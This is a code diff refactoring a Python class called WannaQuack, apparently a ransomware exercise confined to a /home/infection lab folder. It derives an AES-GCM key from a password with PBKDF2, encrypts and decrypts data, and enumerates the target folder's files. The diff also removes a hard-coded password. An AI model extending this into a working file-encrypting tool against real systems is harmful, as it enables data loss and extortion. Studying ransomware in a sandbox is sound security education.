@@ -1,8 +1,6 @@
 import os
 from pathlib import Path
-import threading
 from concurrent.futures import ThreadPoolExecutor
-from Worker import Worker
 
 
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
@@ -10,76 +8,67 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
 
+
 class WannaQuack:
-	def __init__(self, args):
-		self.silent = True if args.silent else False
-		self.files_path = set()
-		self.subdir = set()
-		self.executor = ThreadPoolExecutor()
-		self.woker = []
-		self.password = "Duck4life"
+    def __init__(self, args):
+        self.silent = True if args.silent else False
+        self.files_path = set()
+        self.subdir = set()
+        self.executor = ThreadPoolExecutor()
+        self.woker = []
+        self.password = ""
 
+    def init_aes(self):
+        self.salt = os.urandom(16)
+        key = self.generate_key(self.salt)
+        final_key = key.derive(self.password.encode())
+        self.aes = AESGCM(final_key)
 
-	def init_aes(self):
-		password_bytes = self.password.encode()
+    def generate_key(self, random_salt):
+        key = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=random_salt,
+            iterations=100_000,
+            backend=default_backend(),
+        )
+        return key
 
-		self.salt = os.urandom(16)
+    def encrypt(self, data: bytes):
+        self.init_aes()
+        nonce = os.urandom(12)
+        ciphertext = self.aes.encrypt(nonce, data, None)
+        return self.salt + nonce + ciphertext
 
-		key = self.generate_key(self.salt)
+    def decrypt(self, data: bytes):
+        salt = data[:16]
+        nonce = data[16:28]
+        ciphertext = data[28:]
 
-		final_key = key.derive(password_bytes)
-		self.aes = AESGCM(final_key)
+        key = self.generate_key(salt)
 
+        final_key = key.derive(self.password.encode())
+        self.aes = AESGCM(final_key)
+        decrypt_data = self.aes.decrypt(nonce, ciphertext, None)
 
-	def generate_key(self, random_salt):
-		key = PBKDF2HMAC(
-			algorithm=hashes.SHA256(),
-			length=32,
-			salt=random_salt,
-			iterations=100_000,
-			backend=default_backend()
-		)
-		return key
+        return decrypt_data
 
+    def get_all_files(self):
+        try:
+            target = Path("/home/infection")
+            if not target.is_dir():
+                raise FileNotFoundError(f"Le dossier {target} n'existe pas !")
 
-	def encrypt(self, data: bytes):
-		nonce = os.urandom(12)
-		ciphertext = self.aes.encrypt(nonce, data, None)
-		return self.salt + nonce + ciphertext
+            os.chdir(target)
 
+            for element in target.iterdir():
+                self.subdir.add(element) if element.is_dir() else self.files_path.add(
+                    element
+                )
 
-	def decrypt(self, data: bytes):
-		salt = data[:16]
-		nonce = data[16:28]
-		ciphertext = data[28:]
+        except Exception as e:
+            if self.silent:
+                return False
+            print(e)
 
-		key = self.generate_key(salt)
-
-		final_key = key.derive(self.password.encode())
-		self.aes = AESGCM(final_key)
-		decrypt_data = self.aes.decrypt(nonce, ciphertext, None)
-		return decrypt_data
-
-	def take_position(self):
-		try:
-			target = Path("/home/infection")
-
-			if not target.is_dir():
-				raise FileNotFoundError(f"Le dossier {target} n'existe pas !")
-			
-			os.chdir(target)
-			for element in target.iterdir():
-				print(f"Element found { element}")
-				if element.is_dir():
-					self.subdir.add(element)
-				else:
-					self.files_path.add(element)
-		except Exception as e:
-			if self.silent:
-				return False
-			print(f"[!] Error reading infection position: {e}")
-		
-		return True
-		
-
-
+        return True
